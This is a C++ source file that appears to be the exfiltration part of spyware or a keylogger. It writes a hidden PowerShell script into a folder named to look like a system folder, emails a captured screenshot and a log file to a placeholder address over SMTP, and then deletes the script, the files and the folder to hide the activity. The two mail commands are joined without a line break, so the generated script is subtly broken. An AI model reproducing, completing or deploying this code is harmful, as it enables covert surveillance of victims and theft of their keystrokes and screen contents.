#include "Send.h"

Send::Send() {
	CreateDirectory(L"C:\\Windows\\ServiceApps", NULL);
	SetCurrentDirectoryA("C:\\Windows\\ServiceApps");
	_file.open("Mail.ps1");
	_powershell = "$EmailFrom = \"<sender's email>\"\n";
	_powershell += "$EmailTo = \"<recipient's email>\"\n";
	_powershell += "$EmailSubject = \"<your subject>\"\n";
	_powershell += "$EmailBody = \"<your body>\"\n";
	_powershell += "$SMTPserver = \"<SMTP Server>\"\n";
	_powershell += "$username = \"<sender's email>\"\n";
	_powershell += "$password = \"<sender's email password>\" | ConvertTo-SecureString -AsPlainText -Force\n";
	_powershell += "$credential = New-Object System.Management.Automation.PSCredential($username, $password)\n";
	_powershell += "Send-MailMessage -from \"$EmailFrom\" -to \"$EmailTo\" -subject \"$EmailSubject\" -body \"$EmailBody\" -SmtpServer \"$SMTPserver\" -Priority \"Normal\" -Attachment \"C:\\Windows\\ServiceApps\\screen.jpg\" -Credential $credential -Port 587 -UseSsl";
	_powershell += "Send-MailMessage -from \"$EmailFrom\" -to \"$EmailTo\" -subject \"$EmailSubject\" -body \"$EmailBody\" -SmtpServer \"$SMTPserver\" -Priority \"Normal\" -Attachment \"C:\\Windows\\ServiceApps\\log.txt\" -Credential $credential -Port 587 -UseSsl";

	_file << _powershell << endl;
	 WinExec("powershell.exe -executionpolicy remotesigned -File Mail.ps1", SW_HIDE);
	_file.close();
	 
	 Sleep(5000);
	 remove("Mail.ps1");
	 remove("screen.jpg");
	 remove("log.txt");
	 SetCurrentDirectoryA("C:\\Windows");
	 RemoveDirectory(L"ServiceApps");
}